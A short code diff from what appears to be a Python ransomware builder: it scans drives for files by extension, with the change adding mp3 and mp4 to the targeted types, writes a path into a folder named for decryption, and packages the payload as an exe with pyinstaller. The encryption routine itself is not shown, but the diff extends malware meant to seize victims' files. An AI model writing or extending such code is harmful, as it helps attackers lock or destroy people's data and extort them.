@@ -20,7 +20,7 @@ for i in drive:
     if i in str(cmd):
         target_drive.append(i)
 
-pasvand = ["exe","png","jpg","jpeg","psd","py","txt"]
+pasvand = ["exe","png","jpg","jpeg","psd","py","txt","mp3","mp4"]
 for d in target_drive:
     for p in pasvand:
         try:
@@ -43,6 +43,6 @@ for d in target_drive:
 f = open("../The File In This Folder For Decrypt/base.py",'w')
 f.write(path)
 f.close()
-print(Fore.LIGHTMAGENTA_EX+" [!] Please Wait For Build Exe File ! ")
+print(Fore.LIGHTMAGENTA_EX+" [!] Please Wait For Build Exe File... ")
 os.system("pyinstaller --onefile base.py")
 print(Fore.GREEN+" [+] Your Exe File Build Successfully!Go To /Dist Folder ! ")
